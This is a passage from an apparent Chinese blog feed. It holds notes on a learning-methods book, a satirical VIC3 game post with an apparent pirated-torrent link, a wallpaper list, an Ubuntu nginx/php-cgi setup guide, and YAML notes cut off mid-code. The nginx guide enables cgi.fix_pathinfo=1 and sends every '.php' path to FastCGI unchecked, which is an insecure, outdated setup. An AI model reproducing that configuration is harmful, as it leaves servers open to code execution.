        <content type="html"><![CDATA[<p>推荐一本关于学习方法的书《认知天性》，里面有讲到有一些简单实用的学习策略，能让大家学的更好、记得更牢，而且这些策略人人可用，时时可用。这些方法包括各种形式的<strong>检索练习</strong>——例如小的测试和自测，<strong>间隔练习</strong>、<strong>穿插</strong>不同但相关科目或技能的练习（<strong>多样化练习</strong>），在别人教给你解决方案前自己先试着解决问题，从不同类型问题中提取基本原理和规则。由于学习是反复的过程，需要复习早先学过的东西，持续更新已知，并把它们和新知识联系起来。</p><h2 id="检索式学习"><a href="#检索式学习" class="headerlink" title="检索式学习"></a>检索式学习</h2><p>练习从记忆中检索新知识或新技能是有效的学习工具，也是保持长久记忆的有力武器。但凡需要大脑记忆、需要在将来回忆的东西，都可以用到它——对于事实、复杂的概念、解决问题的技巧、运动技能来说都适用。</p><p>那么到底什么是检索式学习呢？说说我理解的检索式学习：在脑中检索知识，比如课后的一个小测试、对某个知识点用笔默写出来，甚至去参加面试，等等，都可以理解为检索式学习。</p><p>努力检索有助于人们获得更好的学习效果，产生更持久的记忆。我们很容易相信，学东西时越轻松，学习效果越好，但研究表明，事实恰恰相反。只有当头脑被迫工作时，才会将所学的东西记得更牢靠。在检索时所付出的努力越大——只要真正做到这一点检索就会更好地强化你的所学。在第一次检测后，推迟后续检索练习要比立即练习更能强化记忆，因为延迟后再检索需要会费更大力气。</p><p>反复检索不仅能让记忆更持久，还能让知识在更多变的环境中更容易被检索，而且可以解决更多的问题。</p><h2 id="频繁的集中练习只会产生短期记忆"><a href="#频繁的集中练习只会产生短期记忆" class="headerlink" title="频繁的集中练习只会产生短期记忆"></a>频繁的集中练习只会产生短期记忆</h2><p>人们顽固地相信，自己把心思放在一件事上，拼命重复就能学得更好，认为这些观点经受住了时间的考验，而且“练习，练习，再练习”的明显收效再次证明了这种方法的好处。但是，科学家们把习得技能阶段的这种成绩称为“暂时的优势”，并把它同“潜在的习惯优势”区分开来。形成习惯优势有种种技巧，例如有间隔的练习、有穿插内容的练习，以及多样化练习，这些技巧恰恰会放缓有明显成果的学习进程，它们不会在练习中提高我们的表现。我们从表面上看不到成绩提高，也就没有付出努力的动力（大多数人的学习心理就是这样，在看不到成果的时候容易失去动力）。填鸭式练习是集中练习的一种形式，它一直被比作贪食症——吃得不少，但没过多久基本上都吐出来了。</p><h2 id="间隔练习使知识存储更牢固"><a href="#间隔练习使知识存储更牢固" class="headerlink" title="间隔练习使知识存储更牢固"></a>间隔练习使知识存储更牢固</h2><p>把学习与练习间隔开来分期进行，让两者之间隔上一定时间，这样做就能让学习成果更加显著、记忆更加牢固，能有效地形成习惯优势。<strong>间隔多长时间才够？答案很简单：从最低限度上说，间隔的时间足够出现一点儿遗忘就对了</strong>。练习环节中间出现一点儿遗忘是好事，只要它能让人更加努力地练习就行。话说回来，你肯定不愿意忘掉太多东西，以至于检索最终变成了对资料的重新学习。间隔一段时间再练习能巩固记忆。睡眠似乎在巩固记忆的工作中扮演了重要角色，所以在两次练习间至少间隔一天应该是不错的做法。<br>要当心熟悉这个陷阱：你感觉自己明白了某样东西，觉得不再需要练习了。如果想走捷径，这种熟悉会让你在自测时受伤。道格拉斯·拉尔森说：“你必须自觉地说，好吧，我要强迫自己把这些全想起来，要是我想不起来，那我是忘掉了什么，我怎，么会不知道那个呢?’如果是教师出题测验，那就一下子变成你</p><h2 id="穿插练习有助于长期记忆"><a href="#穿插练习有助于长期记忆" class="headerlink" title="穿插练习有助于长期记忆"></a>穿插练习有助于长期记忆</h2><p>穿插练习两样或更多的内容同样也提供了一种间隔。穿插内容练习有助于发展人们辨识不同问题的能力，也是在培养人们从不断增加的解决方案中寻找合适工具的能力。进行穿插内容练习，不能是完成一个科目的全部练习再跳到下一个科目。你需要在每个科目的练习完成前就跳到下一个科目。我们的一个朋友这样描述自己的经历，“我去上了一堂冰球课，学习滑冰、控球、射门。滑冰练习还没进行多长时间，自己刚刚有点儿上手的感觉，教练就转到控球练习上了，这让我感到非常沮丧。灰心地到家后，我说，‘为什么教练不让我们一次把技能练好呢？”其实他是遇上了少有的好教练。这位教练懂得分散精力练习不同技能要比下力气一次掌握一件事更有效果。球员感到沮丧是因为并没有在短时间内看到成果，但到下一周，无论是滑冰、控球，还是其他内容，他都会获得全面进步，效果会好于每次只专心练习一项技能。</p><h2 id="多样化练习促进知识的活学活用"><a href="#多样化练习促进知识的活学活用" class="headerlink" title="多样化练习促进知识的活学活用"></a>多样化练习促进知识的活学活用</h2><p>与穿插内容练习一样，多样化练习有助于学习者树立更开阔的心理模式。这是一种能力，掌握它的人可以评估不断变化的条件，并调整应对方式进行适应。可以说，穿插内容练习与多样化练习有助于学习者超越暂时性记忆，步入更高层次的概念性学习，并把它们应用到实际情景中，从而获得更全面、更深刻、更持久的学习效果。这些学习成果在运动技能中就表现为潜在的习惯优势。</p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>有间隔、有内容穿插出现，以及内容多样化，其实就是我们生活的本来面貌。程序员每开发一个项目，都是一次测验，也是一次检索练习的锻炼。每次常规的拦车检查对于警察来说都是一次测验，而且每次检查都不一样，这会加强警察的外显记忆与内隐记忆。只要他上心，今后的工作就会更有效率。人们常说的一句话是“从经验中学习”。有些人似乎从来不学习，学与不学的一个区别可能就在于，人们是否培养了反思（总结）的习惯。反思（总结）是检索练习的一种形式（发生了什么？我是怎么做的？怎样才能有用？），而且辅以细化加强（下次我要采取别的什么方法？）</p><h2 id="知识的“滚雪球”效应"><a href="#知识的“滚雪球”效应" class="headerlink" title="知识的“滚雪球”效应"></a>知识的“滚雪球”效应</h2><p>学习的过程至少可以分成三步：最开始是对短期工作记忆中信息的<strong>编码</strong>。这时信息还没有被巩固成长期记忆中坚实的知识表征。<strong>巩固</strong>会辨识并稳定记忆线索，赋予其含义，把它们与过去的经验以及长期记忆中已经存储下来的其他知识联系起来。<strong>检索</strong>会更新所学的东西，并让你做到学以致用。</p><p>学习总是建立在已知基础之上。我们是通过与已知建立联系这种方式来解读事件和记忆事件的。</p><p>长期记忆的容量基本上是无限的。你知道得越多，就越有可能为新知识建立联系。</p><p>由于长期记忆的容量颇大，所以关键是要有一种能力，让你在需要的时候锁定并回忆已知。回忆所学知识的难易程度取决于对信息的重复使用（保持检索路径不会被忘却），也取决于你是否建立起了强大的检索线索，因为它能重新激活你的记忆。</p><p>阶段性地检索所学，有助于强化记忆间的联系，也能强化回忆知识的线索，同时还能弱化连通冲突记忆的路径。检索练习若是没什么难度，那就不能强化所学的知识；练习难度越大，收效才越大。</p><p>当你从短期记忆中回忆所学时，例如快速频繁地进行练习，是不需要花什么心思的，也不会有长期性的收效。但当你过一段时间再回忆时，当你对所学的东西有些遗忘时，你就不得不努力重建这一切。这种耗费心力的检索既能强化记忆，又能让所学再次具有可塑性，引发对所学知识的再巩固。再巩固可以用新信息更新你的记忆，同时可以将它们与最近学到的东西联系起来。</p><p>重复进行费力的回忆或是练习，有助于把所学的知识整合成心智模型。在心智模型中，一套彼此相关的概念或一系列运动技能被融会贯通，形成一个有意义的整体。它能适应随后的各种环境，并发挥作用。开车时的感知和操控就是一个例子。在面对弧线球时知道如何打出全垒打也是同一个道理。</p><p>练习的条件如果发生了变化，或是在检索中穿插安排了对其他资料的练习，我们就能强化自己的辨析与归纳能力，凭借全面发展，我们还能把所学的知识用在以后的新环境中。穿插与多样化建立了新的联系，拓展并进一步深化了记忆中的知识，同时增加了检索线索的数量。、</p><p>试着自己想出答案，而不是坐等别人给你答案，或是在拿到解决方案前自行尝试解决一个问题，会产生更好的学习效果，也能让你把正确的答案或解决方案记得更持久。即便有时你会犯错，只要有纠正性反馈就没问题。</p><p>——以上内容摘自《认知天性》，结合本人的个人理解，更多内容请查看该书籍。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么说VIC3是神？</title>
      <link href="/26.html"/>
      <url>/26.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>需要资源的可以自行通过 <a href="https://cos.gjcloak.xyz/uploads/2022/04/24/VIC3_BT.torrent">这里</a> 进行下载游玩体验</p></blockquote><p>为什么说VIC3是神？在谈论这个问题之前，我们先看一看其他P社和4x游戏相比于VIC3差在了哪里。</p><h2 id="首先是犯下傲慢之罪的EU4"><a href="#首先是犯下傲慢之罪的EU4" class="headerlink" title="首先是犯下傲慢之罪的EU4"></a>首先是犯下傲慢之罪的EU4</h2><p>创造出一个点数系统Jonan就露出不屑的笑，这种游戏注定走不长远，事实也是如此。靠着许多阴险的dlc赢了vic2之后就一直在走下坡路。VIC3并不是不会点数系统，只是不想用太简单的机制让萌新上手，可笑某些人不理解神的良苦用心，还用这些事情来讥讽神，我劝你们好自为之。</p><h2 id="然后是犯下愤怒之罪的HOI4"><a href="#然后是犯下愤怒之罪的HOI4" class="headerlink" title="然后是犯下愤怒之罪的HOI4"></a>然后是犯下愤怒之罪的HOI4</h2><p>屡次被神用更完美的模拟所击败，但口服心不服的HOI4，暗中嫉妒着神，甚至用国策瞎几把写来试图超过神。于是，什么狗屁国家的国策都能给全世界的核心，中国的西藏却不给核心，在政治正确的“蒸汽平台”上，HOI4被正义的锁住！</p><h2 id="接着是犯下懒惰之罪的CK3"><a href="#接着是犯下懒惰之罪的CK3" class="headerlink" title="接着是犯下懒惰之罪的CK3"></a>接着是犯下懒惰之罪的CK3</h2><p>自以为漂亮的地图和3d的人物建模就了不起，自创摸鱼更新法，让玩家买一份皇家版就可以3年都不用再买。另外大家有所不知，其实在CK3发售以前，在宣传词中幻想的内容，正是站在光芒中的VIC3，那时神告诉它，你只可以更新这么快，不可越过。然而，CK竟然想和神争抢P社游戏之王的位置，于是神降下了他的惩罚，CK3将失去自己的姓名“deus vult”</p><h2 id="犯下贪婪之罪的stellaris"><a href="#犯下贪婪之罪的stellaris" class="headerlink" title="犯下贪婪之罪的stellaris"></a>犯下贪婪之罪的stellaris</h2><p>只是初出茅庐的太空4x，stellaris就获得了各项榜单的冠军，这一切自然是因为神的应允。神本来钦定stellaris为自己在太空的代言人，在太空继续奴隶制、拜占庭官僚和复兴罗马的重任，为此不惜将完美的POP系统也允许stellaris所使用。但最后stellaris被利益蒙蔽了双眼，不在践行完善POP系统的重任，竟然搞出人口全局增长限制的sb设定，于是神降下了惩罚。stellaris新dlc全部多半差评，设计师的设定被开局机制轻松绕过。</p><h2 id="犯下暴死（暴食）之罪的IR"><a href="#犯下暴死（暴食）之罪的IR" class="headerlink" title="犯下暴死（暴食）之罪的IR"></a>犯下暴死（暴食）之罪的IR</h2><p>相较于神，IR自然是不完美的。所以IR凉了</p><h2 id="犯下暴怒之罪的都市天际线"><a href="#犯下暴怒之罪的都市天际线" class="headerlink" title="犯下暴怒之罪的都市天际线"></a>犯下暴怒之罪的都市天际线</h2><p>为了更好地向pop传递神的福音，神选中了天际线作为自己在省份格内的使者，为自己建设完美的巴别塔。然而，天际线玩家不能领会神的旨意，不能与神的羔羊搞好关系，总是怒气冲冲地指责羔羊们不遵守交规，从而被神所放逐出4萌的队伍！</p><h2 id="最后，犯下淫欲之罪的文明6"><a href="#最后，犯下淫欲之罪的文明6" class="headerlink" title="最后，犯下淫欲之罪的文明6"></a>最后，犯下淫欲之罪的文明6</h2><p>3.04补丁发行之后，神已经非常虚弱了，邪神“席德梅尔”吸走了神的玩家数此时，只有神子们在维护神的尊严。作为神的异端继任者，文明很好的捍卫了4x游戏的尊严。但是玩家们毫不专一，日常讨论波兰、埃及、斯基太、努比亚、印尼、朝鲜的领袖谁好看，最终身败名裂！</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> CK3 </tag>
            
            <tag> HOI4 </tag>
            
            <tag> VIC3 </tag>
            
            <tag> 维多利亚 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>壁纸</title>
      <link href="/28.html"/>
      <url>/28.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/pigo/202206262034517.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207260810174.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207260810794.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207260810698.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207260809898.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207260809087.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207260808485.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207252245647.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207252244414.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207252242116.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207252241234.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207241603781.png?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207232008804.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207282302332.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207282303613.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207282303666.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207290834099.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202207290835687.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208011714026.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208011715447.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208020750044.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208030936205.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208030937207.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208030938781.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208030939595.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208050833367.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208050834673.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208050837635.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208060808437.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208081549636.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208091512401.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208091518290.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208111008500.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208111009388.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208111010603.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/yun/202208120847226.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/yun/202208120848413.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208150746525.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208150747054.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208171416567.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208171632140.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208180953738.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208180954206.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208191053083.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208191054873.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208200901599.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208200902430.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208200903960.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208221710626.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208240905349.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208251654387.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202208260932973.jpeg?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/yun/202210111313365.png?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/yun/202210111314351.png?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/yun/202210111314044.png?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/yun/202210111315235.png?imageMogr2/format/webp/interlace/1/quality/30"> <img src="https://cos.gjcloak.xyz/pigo/202303231104494.jpeg?imageMogr2/format/webp/interlace/1/quality/30"></p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片 </tag>
            
            <tag> 壁纸 </tag>
            
            <tag> bing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Ubuntu安装nginx</title>
      <link href="/134.html"/>
      <url>/134.html</url>
      
        <content type="html"><![CDATA[<h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>（要最新版本下载下来编译吧）<br>装完应该能正常运行了。如果之前有装APACHE要改下端口。。。或者直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove apache2  </span><br><span class="line">/etc/init.d/nginx stop  </span><br><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure><h2 id="安装php-cgi"><a href="#安装php-cgi" class="headerlink" title="安装php-cgi"></a>安装php-cgi</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php-cgi</span><br></pre></td></tr></table></figure><h2 id="改php-cgi的配置"><a href="#改php-cgi的配置" class="headerlink" title="改php-cgi的配置"></a>改php-cgi的配置</h2><p>Ubuntu下是&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini<br>之前有安装过php的话会复制apache的配置文件<br>打开cgi.fix_pathinfo选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgi.fix_pathinfo=1;</span><br></pre></td></tr></table></figure><h2 id="改Nginx的fastcgi传递参数"><a href="#改Nginx的fastcgi传递参数" class="headerlink" title="改Nginx的fastcgi传递参数"></a>改Nginx的fastcgi传递参数</h2><p>Ubuntu下是&#x2F;etc&#x2F;nginx&#x2F;fastcgi_params<br>默认应该已经设置好了，内容差不多就下面那样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_param QUERY_STRING $query_string;  </span><br><span class="line">fastcgi_param REQUEST_METHOD $request_method;  </span><br><span class="line">fastcgi_param CONTENT_TYPE $content_type;  </span><br><span class="line">fastcgi_param CONTENT_LENGTH $content_length;fastcgi_param SCRIPT_NAME $fastcgi_script_name;  </span><br><span class="line">fastcgi_param REQUEST_URI $request_uri;  </span><br><span class="line">fastcgi_param DOCUMENT_URI $document_uri;  </span><br><span class="line">fastcgi_param DOCUMENT_ROOT $document_root;  </span><br><span class="line">fastcgi_param SERVER_PROTOCOL $server_protocol;  </span><br><span class="line">fastcgi_param GATEWAY_INTERFACE CGI/1.1;  </span><br><span class="line">fastcgi_param SERVER_SOFTWARE nginx/$nginx_version;  </span><br><span class="line">fastcgi_param REMOTE_ADDR $remote_addr;  </span><br><span class="line">fastcgi_param REMOTE_PORT $remote_port;  </span><br><span class="line">fastcgi_param SERVER_ADDR $server_addr;  </span><br><span class="line">fastcgi_param SERVER_PORT $server_port;  </span><br><span class="line">fastcgi_param SERVER_NAME $server_name;  </span><br><span class="line"># PHP only, required if PHP was built with –enable-force-cgi-redirect  </span><br><span class="line">fastcgi_param REDIRECT_STATUS 200;</span><br></pre></td></tr></table></figure><h2 id="创建VHost配置（这里只说Ubuntu下的，也就路径和包含文件目录的区别了）"><a href="#创建VHost配置（这里只说Ubuntu下的，也就路径和包含文件目录的区别了）" class="headerlink" title="创建VHost配置（这里只说Ubuntu下的，也就路径和包含文件目录的区别了）"></a>创建VHost配置（这里只说Ubuntu下的，也就路径和包含文件目录的区别了）</h2><p>在&#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;下创建服务器配置文件比如myserver</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -n /etc/nginx/sites-available/myserver /etc/nginx/sites-enabled/myserver</span><br></pre></td></tr></table></figure><p>其实懒的话直接创建在enabled里也没问题－。－<br>内容填：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">server &#123;  </span><br><span class="line">listen 80;  </span><br><span class="line">server_name myserver.com;  </span><br><span class="line">access_log /var/log/nginx/myserver.access.log;location / &#123;  </span><br><span class="line">root /wwwroot/myserver;  </span><br><span class="line">index index.php;  </span><br><span class="line">autoindex off;  </span><br><span class="line">&#125;  </span><br><span class="line">location ~ \.php$ &#123;  </span><br><span class="line">include /etc/nginx/fastcgi_params;  </span><br><span class="line">fastcgi_param SCRIPT_FILENAME /wwwroot/myserver/$fastcgi_script_name;  </span><br><span class="line">fastcgi_pass 127.0.0.1:9000;  </span><br><span class="line">fastcgi_index index.php;  </span><br><span class="line">&#125;  </span><br><span class="line"># redirect server error pages to the static page /50x.html  </span><br><span class="line">error_page 500 502 503 504 /50x.html;  </span><br><span class="line">location = /50x.html &#123;  </span><br><span class="line">root /var/www/nginx-default;  </span><br><span class="line">&#125;  </span><br><span class="line"># deny access to .htaccess files, if Apache’s document root  </span><br><span class="line">location ~ /\.ht &#123;  </span><br><span class="line">deny all;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="安装spawn-fcgi"><a href="#安装spawn-fcgi" class="headerlink" title="安装spawn-fcgi"></a>安装spawn-fcgi</h2><p>下载可到这里，这东西已经独立出来了<br><a href="http://redmine.lighttpd.net/projects/spawn-fcgi/wiki">http://redmine.lighttpd.net/projects/spawn-fcgi/wiki</a><br>下完后解压编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure –prefix=/usr/local  </span><br><span class="line">sudo make  </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="启动spaw-fcgi"><a href="#启动spaw-fcgi" class="headerlink" title="启动spaw-fcgi"></a>启动spaw-fcgi</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo spawn-fcgi -a 127.0.0.1 -p 9000 -u www-data -g www-data -f /usr/bin/php5-cgi -F 10</span><br></pre></td></tr></table></figure><p>哦，对后面10进程不爽的人可以取消或是加到100</p><h2 id="重启Nginx"><a href="#重启Nginx" class="headerlink" title="重启Nginx"></a>重启Nginx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><h2 id="定义下hosts就可以看结果啦"><a href="#定义下hosts就可以看结果啦" class="headerlink" title="定义下hosts就可以看结果啦"></a>定义下hosts就可以看结果啦</h2><p>编辑&#x2F;etc&#x2F;hosts加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 myserver.com</span><br></pre></td></tr></table></figure><p>然后打开浏览器就可以看结果啦～<br>有问题欢迎指出～～</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yaml语言学习笔记</title>
      <link href="/133.html"/>
      <url>/133.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>YAML 是 “YAML Ain’t a Markup Language”（YAML 不是一种标记语言）的递归缩写。在开发的这种语言时，YAML 的意思其实是：”Yet Another Markup Language”（仍是一种标记语言）。</p><p>YAML 的语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别<strong>适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲</strong>（例如：许多电子邮件标题格式和YAML非常接近）。</p><p>YAML 的配置文件后缀为 <strong>.yml</strong>，如：<strong>runoob.yml</strong> 。</p><blockquote><p>yaml常用来用作配置文件，和json类似</p></blockquote><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进不允许使用tab，只允许空格</li><li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li><li>‘#’表示注释</li></ul><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>YAML 支持以下几种数据类型：</p><ul><li><strong>对象</strong>：键值对的集合，又称为映射（mapping）&#x2F; 哈希（hashes） &#x2F; 字典（dictionary）</li><li><strong>数组</strong>：一组按次序排列的值，又称为序列（sequence） &#x2F; 列表（list）</li><li><strong>纯量</strong>（scalars）：单个的、不可再分的值</li></ul><h2 id="YAML-对象"><a href="#YAML-对象" class="headerlink" title="YAML 对象"></a>YAML 对象</h2><p>对象的几种表示形式：</p><p>1、对象键值对使用冒号结构表示 <strong>key: value</strong>，冒号后面要加一个空格。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: value</span><br></pre></td></tr></table></figure><p>2、也可以使用 **key:{key1: value1, key2: value2, …}**。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key:&#123;child-key1:value1,child-key2:value2&#125;</span><br></pre></td></tr></table></figure><p>3、还可以使用缩进表示层级关系；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key: </span><br><span class="line">    child-key1: value1</span><br><span class="line">    child-key2: value2</span><br></pre></td></tr></table></figure><p>同2，只是表示形式不同。</p><p>4、较为复杂的对象格式，可以使用问号加一个空格代表一个复杂的 key，配合一个冒号加一个空格代表一个 value：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 